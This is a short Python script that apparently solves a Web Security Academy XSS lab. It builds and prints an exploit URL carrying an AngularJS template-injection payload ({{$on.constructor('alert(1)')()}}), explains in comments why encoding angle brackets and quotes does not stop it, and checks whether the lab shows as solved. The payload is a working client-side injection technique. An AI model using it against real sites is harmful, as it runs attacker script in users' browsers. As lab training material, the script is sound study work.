import argparse
import requests

# DOM XSS in an AngularJS expression with angle brackets and double quotes
# HTML-encoded. The page uses AngularJS (ng-app), so Angular evaluates {{ }} in the
# region where the search term is reflected. <, >, " are encoded (no HTML XSS), but
# Angular evaluates expressions after parsing, so an AngularJS expression runs JS
# without those characters. This is client-side template injection, so the payload
# executes in the browser - the script prints the exploit URL and checks status.

parser = argparse.ArgumentParser(description="Solve XSS lab 11 (AngularJS expression injection)")
parser.add_argument("lab_url", help="Lab URL (https://0a...web-security-academy.net)")
parser.add_argument("--payload", default="{{$on.constructor('alert(1)')()}}",
                    help="AngularJS expression payload")
args = parser.parse_args()

lab_url = args.lab_url.rstrip("/")

# the payload is reflected into an ng-app region; Angular evaluates it client-side.
# $on.constructor is Function; Function('alert(1)')() runs alert.
exploit_url = f"{lab_url}/?search={requests.utils.quote(args.payload)}"

print("[*] AngularJS template injection - the expression is evaluated in the browser.")
print("[*] Open this URL in a browser to trigger the alert:")
print(f"    {exploit_url}")
print("[*] Tip: confirm Angular is evaluating with ?search={{7*7}} -> renders 49.")

if "is-solved" in requests.get(lab_url + "/").text:
    print("[+] Lab solved!")
else:
    print("[!] Not marked solved yet - load the exploit URL above in a browser.")
